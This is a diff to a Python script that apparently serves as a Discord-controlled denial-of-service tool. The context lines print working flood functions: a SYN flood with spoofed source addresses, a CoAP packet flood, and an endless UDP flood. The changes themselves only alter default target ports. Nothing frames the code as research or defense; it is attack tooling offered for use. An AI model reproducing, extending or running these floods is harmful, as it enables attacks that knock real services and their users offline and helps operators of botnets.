@@ -42,7 +42,7 @@ working_methods = [
 ]
 
 # Attack implementations
-def tcp_chained_syn(ip, port=19732):
+def tcp_chained_syn(ip, port=19327):
     spoof = ".".join(str(random.randint(1, 254)) for _ in range(4))
     send(IP(src=spoof, dst=ip)/TCP(sport=RandShort(), dport=port, flags="S"), verbose=0)
     for _ in range(3):
@@ -134,7 +134,7 @@ def coap_flood(ip, port=5683):
     coap = bytes([0x40 | msg_type, code]) + msg_id + token
     send(IP(dst=ip)/UDP(dport=port)/Raw(load=coap + os.urandom(12)), verbose=0)
     
-def five_udp_flood(ip, port=5357):
+def five_udp_flood(ip, port=19327):
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -227,3 +227,4 @@ if __name__ == "__main__":
         runner_mode()
     else:
         bot.run(DISCORD_TOKEN)
+       
